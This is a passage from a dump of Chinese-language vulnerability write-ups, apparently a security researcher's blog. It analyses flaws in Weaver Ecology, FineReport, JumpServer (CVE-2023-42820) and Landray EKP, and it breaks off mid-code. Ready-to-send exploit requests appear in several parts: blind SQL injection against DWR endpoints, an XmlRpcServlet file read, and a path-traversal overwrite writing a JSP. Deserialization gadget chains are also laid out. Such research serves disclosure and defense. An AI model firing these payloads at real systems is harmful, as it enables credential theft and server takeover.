/dwr/call/plaincall/Validator.dwr HTTP/1.1\nHost: ip\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36\nContent-Length: 191\nAccept-Encoding: gzip\nConnection: close\nContent-Type: text/plain\n \ncallCount=1\npage=\nhttpSessionId=\nscriptSessionId=\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\nc0-id=0\nc0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115\nc0-param1=string:1\nbatchId=0\n或是\nPOST /dwr/call/plaincall/Validator.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1\nHost: ip\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36\nContent-Length: 191\nAccept-Encoding: gzip\nConnection: close\nContent-Type: text/plain\n \ncallCount=1\npage=\nhttpSessionId=\nscriptSessionId=\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\nc0-id=0\nc0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115\nc0-param1=string:1\nbatchId=0\n甚至是\nPOST /dwr/call/plaincall/1.dwr HTTP/1.1\nHost: ip\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36\nContent-Length: 191\nAccept-Encoding: gzip\nConnection: close\nContent-Type: text/plain\n \ncallCount=1\npage=\nhttpSessionId=\nscriptSessionId=\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\nc0-id=0\nc0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115\nc0-param1=string:1\nbatchId=0\n重要的是\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\n\n已经注入的参数。\n为什么仅影响 E8\n对比 E8 和 E9 的实现\n// E8\npublic boolean ifNewsCheckOutByCurrentUser(String var1, String var2) {\n\tboolean var3 = false;\n\tRecordSet var4 = new RecordSet();\n\tvar4.executeQuery(&quot;select checkOutStatus,checkOutUserId from DocFrontpage where id=&quot; + var1);\n\t// ...\n}\n \n// E9\npublic boolean ifNewsCheckOutByCurrentUser(String var1, String var2) {\n\tboolean var3 = false;\n\tRecordSet var4 = new RecordSet();\n\tvar4.executeQuery(&quot;select checkOutStatus,checkOutUserId from DocFrontpage where id=?&quot;, new Object[]{var1});\n\t// ...\n}\nE8 中是直接采用字符串拼接，而 E9 采用的是预编译方式，所以不受影响。\n总结\n可用的 methodName 如下，scriptName 固定为 DocDwrUtil\n// 注入位置为第二个参数\nc0-methodName=ifCanRepeatName\n// 注入位置为第一个参数\nc0-methodName=ifCheckOutByCurrentUser\nc0-methodName=checkInNewsDsp\nc0-methodName=ifNewsCheckOutByCurrentUser\n"},"articles/security/vulnerabilities/ecology/泛微-Ecology-XmlRpcServlet-远程代码执行漏洞":{"title":"泛微 Ecology XmlRpcServlet 远程代码执行漏洞","links":[],"tags":["ecology"],"content":"分析\n泛微 Ecology 中使用了依赖 org.apache.xmlrpc:xmlrpc-server:3.1.3，此依赖中的类 org.apache.xmlrpc.webserver.XmlRpcServlet 继承了 HttpServlet。而 Resin 容器配置了 InvokerServlet，可通过类的全限定名称来加载 Servlet，具体见 resin.xml 配置文件\n&lt;servlet-mapping url-pattern=&#039;/weaver/*&#039; servlet-name=&#039;invoker&#039;/&gt;\n同时 Ecology 并未对访问路径进行限制，导致可以不受限制的直接访问到 org.apache.xmlrpc.webserver.XmlRpcServlet。\n调用关系梳理\ndoPost:196, XmlRpcServlet (org.apache.xmlrpc.webserver)\nservice:159, HttpServlet (javax.servlet.http)\nservice:97, HttpServlet (javax.servlet.http)\ndoFilter:109, ServletFilterChain (com.caucho.server.dispatch)\ndoFilter:129, PFixFilter (weaver.filter)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilter:75, DynamicMonitorXFilter (weaver.filter)\ndoFilter:81, MonitorXFilter (weaver.filter)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilter:51, DateFormatFilter (weaver.dateformat)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilter:349, MultiLangFilter (weaver.filter)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilterInternal:40, XssFilter (weaver.filter)\ndoFilter:76, OncePerRequestFilter (org.springframework.web.filter)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilter:36, XssRequestForWeblogic (weaver.security.webcontainer)\ninvoke:-1, GeneratedMethodAccessor191 (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\nprocess:794, SecurityMain (weaver.security.filter)\ninvoke:-1, GeneratedMethodAccessor133 (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ndoFilterInternal:51, SecurityFilter (weaver.filter)\ndoFilter:76, OncePerRequestFilter (org.springframework.web.filter)\ndoFilter:89, FilterFilterChain (com.caucho.server.dispatch)\ndoFilter:156, WebAppFilterChain (com.caucho.server.webapp)\ndoFilter:95, AccessLogFilterChain (com.caucho.server.webapp)\nservice:304, ServletInvocation (com.caucho.server.dispatch)\nhandleRequest:840, HttpRequest (com.caucho.server.http)\ndispatchRequest:1367, TcpSocketLink (com.caucho.network.listen)\nhandleRequest:1323, TcpSocketLink (com.caucho.network.listen)\nhandleRequestsImpl:1307, TcpSocketLink (com.caucho.network.listen)\nhandleRequests:1215, TcpSocketLink (com.caucho.network.listen)\nhandleAcceptTaskImpl:1011, TcpSocketLink (com.caucho.network.listen)\nrunThread:117, ConnectionTask (com.caucho.network.listen)\nrun:93, ConnectionTask (com.caucho.network.listen)\nhandleTasks:175, SocketLinkThreadLauncher (com.caucho.network.listen)\nrun:61, TcpSocketAcceptThread (com.caucho.network.listen)\nrunTasks:173, ResinThread2 (com.caucho.env.thread2)\nrun:118, ResinThread2 (com.caucho.env.thread2)\n\n那么直接构造请求即可\nPoc\n下面使用 weaver.mobile.WorkflowService#getAttachment 方法读取任意文件，\nPOST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1\nHost: 10.37.129.3\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203\nConnection: close\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nCookie: loginPageURL=; __randcode__=5a423262-7dd3-40e1-ac0f-e53259a1c94d; loginidweaver=1; languageidweaver=7; loginuuids=1; ecology_JSessionid=aaauA9sfC5l4K6c0R28px; JSESSIONID=aaauA9sfC5l4K6c0R28px; ecology_JSessionId=aaauA9sfC5l4K6c0R28px; login_locale=zh_CN; avatarImageUrl=5186661464047832325; tenantId=default\nContent-Length: 198\nAccept-Encoding: gzip\nContent-Type: application/xml\n \n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;methodCall&gt;\n&lt;methodName&gt;WorkflowService.getAttachment&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;\n    &lt;value&gt;&lt;string&gt;C:\\Ecology1907\\Resin\\conf\\resin.xml&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall&gt;\n响应内容如下\n\n将内容 base64 解码即可看到原文。"},"articles/security/vulnerabilities/finereport/channel-反序列化漏洞/帆软报表---channel-反序列化漏洞":{"title":"帆软报表 - channel 反序列化漏洞","links":[],"tags":["finereport"],"content":"\n分析版本 11.0.10，此漏洞为 channel 接口 22 年历史漏洞的绕过。\n\n接口位置位于\n/webroot/decision/remote/design/channel\n\n调用链大致为\nRemoteDesignResource#onMessage\n  RemoteDesignService.getInstance().onMessage(var1, var2);\n    WorkContext.handleMessage(var6)\n      WorkspaceServerInvoker.handleMessage\n        WorkspaceServerInvoker.deserializeInvocation\n          (Invocation)SerializerHelper.deserialize(var1, GZipSerializerWrapper.wrap(SafeInvocationSerializer.getDefault()));\n            GZipSerializerWrapper.deserialize\n\n\ncom.fr.decision.webservice.v10.remote.RemoteDesignResource\ncom.fr.serialization.GZipSerializerWrapper\n\n注意 payload 需要通过 gzip 进行压缩。是典型的反序列化漏洞，并没有什么特别的。\n分析\n黑名单\n22 年修复 channel 接口漏洞的方式为黑名单，文件位于 fine-core-11.0.jar/com/fr/serialization/blacklist.txt\n绕过方式\n黑名单共有 423 个类，很恶心，从官网描述看是有绕过方法的。但感觉直接越过黑名单不太可能，除非有全新的利用链。\n二次反序列化\n另一种方式是二次反序列化，其中一种是使用 SignedObject，幸运的是，它不在黑名单里。\nprivate void readObject(java.io.ObjectInputStream s)\n\tthrows java.io.IOException, ClassNotFoundException {\n\t\tjava.io.ObjectInputStream.GetField fields = s.readFields();\n\t\tcontent = ((byte[])fields.get(&quot;content&quot;, null)).clone();\n\t\tsignature = ((byte[])fields.get(&quot;signature&quot;, null)).clone();\n\t\tthealgorithm = (String)fields.get(&quot;thealgorithm&quot;, null);\n}\n它的成员 content 中存储序列化的数据，在 getObject 方法中则会对 content 的内容进行反序列化。\npublic Object getObject()\n\tthrows IOException, ClassNotFoundException\n{\n\t// creating a stream pipe-line, from b to a\n\tByteArrayInputStream b = new ByteArrayInputStream(this.content);\n\tObjectInput a = new ObjectInputStream(b);\n\tObject obj = a.readObject();\n\tb.close();\n\ta.close();\n\treturn obj;\n}\n那么问题就变成怎么在绕过帆软黑名单的情况下，在反序列化时触发 getObject 方法。\n触发 getter 方法，已知的有\n\nBeanComparator→ PropertyUtils#getProperty\nPOJONode#toString\nJSONOBJECT#toString\nToStringBean#toString\n\n但是上述方式只有第二种 POJONode#toString 在测试环境中是存在的，那么进一步如何调用 POJONode#toString 方法。第一个想到的肯定是 BadAttributeValueExpException，但想也别想，它在黑名单里。\n查找利用链\n首先将收集的，常见反序列化利用链的入口类拿来与黑名单进行比对『由于包名不同，所以比对类名就好』，得到一个结果\ncom.fr.third.org.apache.commons.collections4.bag.TreeBag\n\nTreeBag 可用于 CC4 的变体构造，可以使用它触发 Comparator 接口的 compare 方法。那么接下来，搜寻是否有可用的 Comparator 的实现类，它可序列化并且 compare 会调用 toString 方法。\n使用 tabby 创建数据库后，在 neo4j 中执行如下查询。\nmatch (source:Method {NAME:&quot;readObject&quot;})\nmatch (sink:Method {NAME:&quot;toString&quot;})&lt;-[:CALL]-(m1:Method)\nwhere source.CLASSNAME = &#039;com.fr.third.org.apache.commons.collections4.bag.TreeBag&#039; and m1.NAME = &#039;compare&#039; and m1.IS_SERIALIZABLE = true\ncall apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 15) yield path where single (n in nodes(path) where n.CLASSNAME in [&#039;java.util.TreeMap&#039;])\nreturn path limit 10\n\n查询结果如下\n\n从查询结果中可以得到类 com.fr.third.jodd.util.NaturalOrderComparator，当然它不是唯一的，你可以继续扩大查找范围。\n它们的 compare 方法分别如下\npublic int compare(T o1, T o2) {\n\tString str1 = o1.toString();\n\tString str2 = o2.toString();\n\t// ...\n}\n\n流量捕获\nHW 期间捕获到了这个漏洞的相关流量，其中提到了另外两个类 com.fr.base.ClassComparator 和 org.freehep.util.VersionComparator，\n在 com.fr.base.ClassComparator 的 compare 方法中，会根据成员 className 构造另一个 Comparator，\npublic int compare(Object var1, Object var2) {\n\tif (this.comparator == null) {\n\t\ttry {\n\t\t\tthis.comparator = (Comparator)StableUtils.classForName(this.className).newInstance();\n\t\t} catch (Exception var4) {\n\t\t\tFineLoggerFactory.getLogger().error(var4.getMessage(), var4);\n\t\t}\n\t}\n \n\treturn this.comparator == null ? 0 : this.comparator.compare(var1, var2);\n}\n而 org.freehep.util.VersionComparator 实现了 Comparator 接口，它的 compare 方法会触发 toString 方法\npublic int compare(Object obj, Object obj1) {\n\treturn this.versionNumberCompare(obj.toString(), obj1.toString());\n}\n以此触发 POJONode#toString 并进一步触发 geObject。\n那么至此，利用链的构造思路就有了，调用链条如下\nTreeBag#readObject\n  TreeMap#put\n    compare(key, key);\n      ClassComparator#compare\n        // 构造 VersionComparator (Comparator)StableUtils.classForName(this.className).newInstance();\n        this.comparator.compare(var1, var2);\n          VersionComparator#compare\n            // 触发 `POJONode#toString`\n            obj.toString()\n              ...\n              // 触发第二次反序列化，这里可选择使用历史漏洞中的 payload\n              SignedObject#geObject\n使用 com.fr.third.jodd.util.NaturalOrderComparator 的话调用链条如下\nTreeBag#readObject\n  TreeMap#put\n    compare(key, key);\n      NaturalOrderComparator#compare\n\t\to1.toString()\n\t\t  ...\n\t\t  // 触发第二次反序列化，这里可选择使用历史漏洞中的 payload\n\t\t  SignedObject#geObject\n授权问题\n在 V11.0.10 版本中测试时，channel 接口需要验证 JWT 的，意味着要获取授权才能利用。\n\n而 V10.0.19 版本，则不需要。\n插曲\n在搜寻可用于构造利用链的类时，看到了 com.fr.third.v2.org.apache.commons.collections4.functors.FactoryTransformer transform 方法，\npublic O transform(I input) {\n\treturn (O)this.iFactory.create();\n}\n在 Factory 的实现类里，找到 com.fr.third.v2.org.apache.commons.collections4.map.MultiValueMap$ReflectionFactory\npublic T create() {\n\ttry {\n\t\treturn (T)this.clazz.getDeclaredConstructor().newInstance();\n\t} catch (Exception var2) {\n\t\tthrow new FunctorException(&quot;Cannot instantiate class: &quot; + this.clazz, var2);\n\t}\n}\n它可通过反射调用创建类实例，但是只能为无参构造方法，价值不是特别大，先待定。\n参考\n\nhelp.fanruan.com/finereport/doc-view-4833.html\nwww.yang99.top/index.php/archives/93/ 「帆软 channel接口反序列化漏洞分析」\nwww.cnblogs.com/zpchcbd/p/16758226.html 「记一次失败的帆软的反序列化链挖掘」\n"},"articles/security/vulnerabilities/finereport/帆软报表---文件覆盖漏洞":{"title":"帆软报表 - 文件覆盖漏洞","links":[],"tags":["tags"],"content":"漏洞详情\n帆软报表存在文件覆盖漏洞，可以覆盖已有 jsp 文件，从而写入 webshell。\n漏洞验证\n后台洞，需要获取权限。\nupdate.jsp 文件的初始内容如下\n&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;GBK&quot;%&gt;\n&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;\n&lt;%\n   String ID = java.net.URLDecoder.decode(request.getParameter(&quot;ID&quot;),&quot;UTF-8&quot;);\n   String NAME =java.net.URLDecoder.decode(request.getParameter(&quot;NAME&quot;),&quot;UTF-8&quot;);\n   String TELEPHONE = java.net.URLDecoder.decode(request.getParameter(&quot;TELEPHONE&quot;),&quot;UTF-8&quot;);\n%&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;修改基本参数&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;table  width=&quot;350&quot; border=&quot;0&quot; cellspacing=&quot;1&quot; cellpadding=&quot;5px&quot;&gt;\n      &lt;tr&gt;\n        &lt;th width=&quot;130&quot;&gt;运货商编码:&lt;/th&gt;&lt;td width=&quot;208&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;ID&quot; value=&quot;&lt;%=ID %&gt;&quot; disabled/&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n\t  &lt;tr&gt;\n        &lt;th&gt;公司名称:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;NAME&quot; value=&quot;&lt;%=NAME %&gt;&quot;/&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n      &lt;th&gt;电话:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;TELEPHONE&quot; value=&quot;&lt;%=TELEPHONE %&gt;&quot;/&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n   &lt;/table&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n发送如下请求\nPOST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../update.jsp HTTP/1.1\nHost: 10.211.55.8:8075\nContent-Length: 74\nAccept: */*\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36\nContent-Type:text/xml;charset=UTF-8\nOrigin: http://10.211.55.8:8075\nReferer: http://10.211.55.8:8075/WebReport/ReportServer?op=fs\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: JSESSIONID=19dwwqsyod5h2; fr_remember=false; fr_password=; fr_username=trganda\nConnection: close\n \n{&quot;__CONTENT__&quot;:&quot;&lt;%out.println(\\&quot;Hello World!\\&quot;);%&gt;&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;}\n\n再查看 update.jsp 的内容，已变为\n&lt;%out.println(&quot;Hello World!&quot;);%&gt;\n"},"articles/security/vulnerabilities/jumpserver/JumpServer-验证码可计算推演(CVE-2023-42820)":{"title":"Jumpserver 验证码可计算推演(CVE-2023-42820)","links":[],"tags":["vulnerability","jumpserver"],"content":"漏洞的根本原因是由于使用了不够安全的 rand 方法，当 seed 固定时，攻击者可以推测出通过该 seed 生成的随机数，从而推断出验证码。\n漏洞分析\n伪随机数的安全性\nJumperServer 使用如下函数生成随机字符串，使用它作为重置密码的验证码『正常的业务逻辑，会将该验证码发送至用户的邮箱』\n\n代码文件路径 apps/common/utils/random.py\n\ndef random_string(length: int, lower=True, upper=True, digit=True, special_char=False):\n    args_names = [&#039;lower&#039;, &#039;upper&#039;, &#039;digit&#039;, &#039;special_char&#039;]\n    args_values = [lower, upper, digit, special_char]\n    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]\n    args_string_map = dict(zip(args_names, args_string))\n    kwargs = dict(zip(args_names, args_values))\n    kwargs_keys = list(kwargs.keys())\n    kwargs_values = list(kwargs.values())\n    args_true_count = len([i for i in kwargs_values if i])\n    assert any(kwargs_values), f&#039;Parameters {kwargs_keys} must have at least one `True`&#039;\n    assert length &gt;= args_true_count, f&#039;Expected length &gt;= {args_true_count}, bug got {length}&#039;\n \n    can_startswith_special_char = args_true_count == 1 and special_char\n \n    chars = &#039;&#039;.join([args_string_map[k] for k, v in kwargs.items() if v])\n \n    while True:\n        password = list(random.choice(chars) for i in range(length))\n        for k, v in kwargs.items():\n            if v and not (set(password) &amp; set(args_string_map[k])):\n                # 没有包含指定的字符, retry\n                break\n        else:\n            if not can_startswith_special_char and password[0] in args_string_map[&#039;special_char&#039;]:\n                # 首位不能为特殊字符, retry\n                continue\n            else:\n                # 满足要求终止 while 循环\n                break\n \n    password = &#039;&#039;.join(password)\n    return password\n而这里使用的随机数种子，是用户可获得的，并且由于使用的是 python 中的 random.seed 函数，导致当 seed 相同时，生成的随机数序列也是相同的。Python 官方文档给出了如下提示，推荐使用 secrets 模块代替『需要 python 3.6 以上』\n\nWarning The pseudo-random generators of this module should not be used for security purposes. For security or cryptographic uses, see the secrets module.\n\n下面对这个方法做一个简单的测试\n\nnop_random 函数摘抄自 vulhub 项目，不清楚为什么要做这一步，而不是直接使用 random.seed(seed)\n\ndef random_string(length: int, lower=True, upper=True, digit=True, special_char=False):\n\t...\n\t\ndef nop_random(seed: str):\n    random.seed(seed)\n    for i in range(4):\n        random.randrange(-35, 35)\n \n    for p in range(int(180 * 38 * 0.1)):\n        random.randint(0, 180)\n        random.randint(0, 38)\n \nif __name__ == &quot;__main__&quot;:\n    nop_random(&quot;123456&quot;)\n    for i in range(4):\n        code = random_string(6, lower=False, upper=False)\n        logging.info(&quot;your code is %s&quot;, code)\n重复执行上述代码 2 次，会发生得到的结果是相同的，如下所示。\n2023-10-09 17:25:42,346 - INFO - your code is 693489\n2023-10-09 17:25:42,346 - INFO - your code is 672691\n2023-10-09 17:25:42,346 - INFO - your code is 282104\n2023-10-09 17:25:42,346 - INFO - your code is 321187\n这意味着只要知道 seed，就可以推断随机序列。\n种子泄露\nseed 是怎么泄露的呢？攻击者需要首先获取 seed 才能进行推断操作。而这得从 django-simple-captcha 库说起，JumperServer 使用 django-simple-captcha 作为验证码的生成库。\nP 牛在他的 文章 中介绍了生成验证码的大致过程：\n\n为验证码生成 challenge『验证字符串』 和 response『答案』\n根据 challenge 和 response 生成一个 hash key\ndjango-simple-captcha 内部会根据这个 hash key 对验证字符串图片进行变异，并将图片与 hash key 关联\n用户在前端页面可以获取该图片的链接『形如 http://127.0.0.1:8000/captcha/image/7971533e468df419e9bdd7e8e09b8ae2388e97ef/』，其中就包含了这个 hash key，例如 7971533e468df419e9bdd7e8e09b8ae2388e97ef\n\ndjango-simple-captcha 的作者使用 random.seed(seed) 方法固定种子的目的是为了确保同一对 challenge 和 response 生成的验证码图片相同。仅从验证码生成的角度看这没有问题，但不幸的是 JumperServer 中使用了这个 hash key 来生成后续的验证码，见下图\n\n代码路径 apps/authentication/api/password.py\n\n\n漏洞利用\n通过前面的分析可以了解漏洞的利用步骤，访问忘记密码页面，会生成验证码图片，图片的链接会泄露 hash key，也就是 seed。\n\n输入验证码后点击提交就会触发下一步邮箱验证码的生成，此时可通过前面获取的 seed 在本地推断生成验证码，之后提交即可。\n但是 JumperServer 内部使用了负载均衡和多线程来处理访问请求，不同的线程之间种子可能不同。如果前面访问的两个页面是由不同线程处理的就会利用失败，为此需要让所有线程的种子相同，怎么做呢？\n前面提到可通过 /captcha/image/&lt;hash key&gt;/ 访问 django-simple-captcha 生成的图片，而对应的函数如下\ndef captcha_image(request, key, scale=1):\n    if scale == 2 and not settings.CAPTCHA_2X_IMAGE:\n        raise Http404\n    try:\n        store = CaptchaStore.objects.get(hashkey=key)\n    except CaptchaStore.DoesNotExist:\n        # HTTP 410 Gone status so that crawlers don&#039;t index these expired urls.\n        return HttpResponse(status=410)\n \n    random.seed(key)  # Do not generate different images for the same key\n    # ...\n其中会调用 random.seed(key) 设置种子，而 key 是可控的。那么只要高频重复的访问 /captcha/image/&lt;hash key&gt;/ 就有机会让所有线程的种子相同。\n漏洞复现\nP 牛已经在 vulhub 中提供了开箱即用的环境，按照以下步骤即可复现：\n\ndocker compose up 启动环境\n访问 http://localhost:8080\n点击忘记密码，右键在新标签页打开验证码图片『刷新忘记密码也面知道验证码图片中不包含数字 10』，复制其中的 hash key\n刷新一次上一步中的忘记密码页面，目的是避免在进入邮箱验证码页面前使用上一个验证码图片的 hash key 来生成邮箱验证码，因为一旦输入了正确的验证码图片的答案，对应的 hash key 也就消失了『邮箱验证码通过调用 /api/v1/authentication/password/reset-code/?token= 生成』。\n输入用户名 admin 和验证码答案，进入下一个邮箱验证码的页面 http://localhost:8080/core/auth/password/forgot/?token=sceOx7yWuAH9wWcuzc0nMQmLBzEPNhkhuTfl\n复制 url 中的 token\n使用 token 和前面获取的 hash key，执行 python poc.py -t http://localhost:8080 --email admin@mycomany.com --seed [seed] --token [token]\n\n复现过程如下图\n\n疑问\nvulhub 上提到如果验证码图片中包含数字 10 则无法利用。\n参考\n\npaper.seebug.org/3043/#cve-2023-42820 『Phith0n 的分析文章』\ngithub.com/mbi/django-simple-captcha/pull/221 『django-simple-captcha 修复详情』\ndjango-simple-captcha.readthedocs.io/en/latest/ 『django-simple-captcha 文档』\n"},"articles/security/vulnerabilities/landray-ekp/蓝凌-EKP-sysUiExtend-文件上传漏洞":{"title":"蓝凌 EKP - sysUiExtend 文件上传漏洞","links":[],"tags":["ekp"],"content":"路由如下\n/sys/ui/sys_ui_extend/sysUiExtend.do\n\n漏洞分析\n根据路由可定位至\ncom.landray.kmss.sys.ui.service.SysUiExtendService\n\n对应的方法为 upload 方法。\npublic void upload(SysUiExtendForm xform, RequestContext requestInfo) throws Exception {\n\tHttpServletRequest request = requestInfo.getRequest();\n\tJSONObject jsonInfo = null;\n\tFormFile file = xform.getFile();\n\tif (file != null) {\n\t\tjsonInfo = this.checkExtend(xform.getFile()); // [1]\n首先从请求中获取文件内容 [1]，并交给 checkExtend 方法检查，\nprivate JSONObject checkExtend(String fileName, InputStream is) throws Exception {\n\tJSONObject resultObj = new JSONObject();\n\tString ext = FilenameUtils.getExtension(fileName);\n\tif (StringUtil.isNull(ext)) {\n\t\tthrow new Exception(ResourceUtil.getString(&quot;ui.help.luiext.selfile&quot;, &quot;sys-ui&quot;));\n\t} else if (!ext.equals(&quot;zip&quot;)) { // [2] 检查后缀\n\t\tthrow new Exception(ResourceUtil.getString(&quot;ui.help.luiext.upload.fileType&quot;, &quot;sys-ui&quot;));\n\t} else {\n\t\tString folderPath = System.getProperty(&quot;java.io.tmpdir&quot;);\n\t\tif (!folderPath.endsWith(&quot;/&quot;) &amp;&amp; !folderPath.endsWith(&quot;\\\\&quot;)) {\n\t\t\tfolderPath = folderPath + &quot;/&quot;;\n\t\t}\n \n\t\tString folderName = IDGenerator.generateID();\n\t\tfolderPath = folderPath + folderName;\n\t\tFile zipFile = new File(folderPath + &quot;.zip&quot;);\n\t\tFileOutputStream output = null;\n \n\t\ttry {\n\t\t\toutput = new FileOutputStream(zipFile);\n\t\t\tIOUtils.copy(is, output);\n\t\t\toutput.close();\n\t\t\tZipUtil.unZip(zipFile, folderPath); // [3] 解压文件，会检查是否有目录穿越\n\t\t\tFile iniFile = new File(folderPath + &quot;/ui.ini&quot;);\n\t\t\tif (!iniFile.exists()) {\n\t\t\t\tthrow new Exception(ResourceUtil.getString(&quot;ui.help.luiext.upload.file.notExists&quot;, &quot;sys-ui&quot;));\n\t\t\t}\n \n\t\t\tMap&lt;String, String&gt; map = IniUtil.loadIniFile(iniFile);\n\t\t\tString extendId = (String)map.get(&quot;id&quot;);\n\t\t\tString extendName = (String)map.get(&quot;name&quot;);\n\t\t\tif (StringUtil.isNull(extendId)) {\n\t\t\t\tthrow new Exception(ResourceUtil.getString(&quot;ui.help.luiext.upload.id.notExists&quot;, &quot;sys-ui&quot;));\n\t\t\t}\n \n\t\t\tresultObj.put(&quot;extendId&quot;, extendId);\n\t\t\tresultObj.put(&quot;extendName&quot;, extendName);\n\t\t\tresultObj.put(&quot;folderName&quot;, folderName);\n\t\t\tif (map.containsKey(&quot;thumb&quot;)) {\n\t\t\t\tresultObj.put(&quot;thumbnail&quot;, map.get(&quot;thumb&quot;));\n\t\t\t}\n\t\t} catch (Exception var22) {\n\t\t\tthrow var22;\n\t\t} finally {\n\t\t\ttry {\n\t\t\t\tzipFile.delete();\n\t\t\t} catch (Exception var21) {\n\t\t\t}\n \n\t\t\ttry {\n\t\t\t\toutput.close();\n\t\t\t} catch (Exception var20) {\n\t\t\t}\n\t\t}\n \n\t\treturn resultObj;\n\t}\n}\n这个方法挺有意思的，第一次看的时候发现会检查上传的压缩包文件 [2]，并且 [3] 中对压缩包进行解压时会检查是否会产生目录穿越。\n解压方法如下 com.landray.kmss.km.imeeting.util.ZipUtil#unzip，\npublic static void unZip(File zipFile, String destination) throws IOException {\n\t// ...\n\ttry {\n\t\twhile(en.hasMoreElements()) {\n\t\t\tentry = (ZipEntry)en.nextElement();\n\t\t\tif (!entry.getName().contains(&quot;..\\\\&quot;) &amp;&amp; !entry.getName().contains(&quot;../&quot;)) {\n看到这对时候以为没发利用了。\n但是回过头看 checkExtend，在解压后会读取压缩包中的 ui.ini 文件，并将其中的 id 和 name 赋值给返回值 resultObj\nFile iniFile = new File(folderPath + &quot;/ui.ini&quot;);\n \nMap&lt;String, String&gt; map = IniUtil.loadIniFile(iniFile);\nString extendId = (String)map.get(&quot;id&quot;);\nString extendName = (String)map.get(&quot;name&quot;);\n \nresultObj.put(&quot;extendId&quot;, extendId);\nresultObj.put(&quot;extendName&quot;, extendName);\nresultObj.put(&quot;folderName&quot;, folderName);\n而在 upload 方法中，会根据返回值的 extendId 保存压缩包中的内容至指定目录。\nString extendId = jsonInfo.getString(&quot;extendId&quot;);\nString extendName = jsonInfo.getString(&quot;extendName&quot;);\nString folderName = jsonInfo.getString(&quot;folderName&quot;);\nboolean isExists = this.isExistsExtend(extendId);\nif (isExists) {\n\tString nameText = &quot; &quot; + extendId + &quot;（&quot; + extendName + &quot;）&quot;;\n\tString errorMessage = ResourceUtil.getString(&quot;ui.help.luiext.upload.exist.replace&quot;, &quot;sys-ui&quot;, null, nameText);\n\trequest.setAttribute(&quot;errorMessage&quot;, errorMessage);\n\trequest.setAttribute(&quot;extendId&quot;, extendId);\n\trequest.setAttribute(&quot;folderName&quot;, folderName);\n} else {\n    // 若不存在则保存\n\tthis.saveExtend(extendId, folderName);\n\tif (!ThemeUtil.isNotMerge) {\n\t\tThemeUtil.mergeAllTheme(request.getContextPath());\n\t}\n \n\trequest.setAttribute(&quot;successMessage&quot;, ResourceUtil.getString(&quot;ui.help.luiext.upload.success&quot;, &quot;sys-ui&quot;));\n}\n而保存的位置确是由 extendId 确定的。\npublic void saveExtend(String extendId, String folderName) throws Exception {\n\tString folderPath = System.getProperty(&quot;java.io.tmpdir&quot;);\n\tif (!folderPath.endsWith(&quot;/&quot;) &amp;&amp; !folderPath.endsWith(&quot;\\\\&quot;)) {\n\t\tfolderPath = folderPath + &quot;/&quot;;\n\t}\n \n\tfolderPath = folderPath + folderName;\n\tFile extendFolder = new File(ResourceUtil.KMSS_RESOURCE_PATH + &quot;/&quot; + &quot;ui-ext&quot; + &quot;/&quot; + extendId);\n\tFileUtils.copyDirectory(new File(folderPath), 